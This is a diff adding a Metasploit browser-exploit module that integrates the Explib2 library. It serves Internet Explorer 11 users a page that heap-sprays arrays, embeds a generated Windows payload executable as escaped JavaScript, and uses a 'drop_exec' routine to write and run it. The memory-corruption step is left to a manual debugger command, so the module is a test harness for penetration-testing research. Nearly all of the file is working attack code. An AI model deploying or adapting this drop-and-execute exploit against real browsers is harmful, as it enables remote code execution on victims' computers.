@@ -1,0 +1,89 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::BrowserExploitServer
+  include Msf::Exploit::EXE
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "Explib2 Drop Exec Test Case",
+      'Description'    => %q{
+        This module allows to test integration of Explib2 into metasploit.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'guhe120', # Original explib2 author
+          'juan vazquez'
+        ],
+      'References'     =>
+        [
+          [ 'URL', 'https://github.com/jvazquez-r7/explib2' ] # The original repo has been deleted
+        ],
+      'Platform'       => 'win',
+      'BrowserRequirements' =>
+        {
+          :source  => /script/i,
+          :os_name => OperatingSystems::WINDOWS,
+          :ua_name => HttpClients::IE,
+          :ua_ver  => '11.0'
+        },
+      'Targets'        =>
+        [
+          [ 'Automatic', { } ]
+        ],
+      'DisclosureDate' => "Mar 28 2014",
+      'DefaultTarget'  => 0))
+  end
+
+  def exploit_html
+
+    exe_js = Rex::Text.to_unescape(generate_payload_exe, ENDIAN_LITTLE, "\\u")
+
+    template = %Q|<html>
+<head>
+  <script>
+    <%= js_explib2_payload("drop_exec") %>
+  </script>
+  <script>
+    <%= js_explib2 %>
+  </script>
+</head>
+<body>
+<script>
+var pe_exe = "<%= exe_js %>"
+
+var num_arrays = 98688;
+var arr_size = (0x1000 - 0x20)/4;
+var explib = new ExpLib( num_arrays, arr_size, 0x1a1b3000, new payload_drop_exec(pe_exe) );
+explib.setArrContents([0x21212121, 0x22222222, 0x23232323, 0x24242424]);
+explib.spray();
+
+/*
+* Modify array length
+* In the real world exp, you  need to modify the array length field with your vulnerability
+*/
+alert( 'Execute the command in windbg: "ed 1a1b3000+18 400"' );
+
+explib.go();
+
+</script>
+</body>
+</html>
+    |
+
+    return template, binding()
+  end
+
+  def on_request_exploit(cli, request, target_info)
+    send_exploit_html(cli, exploit_html)
+  end
+
+end
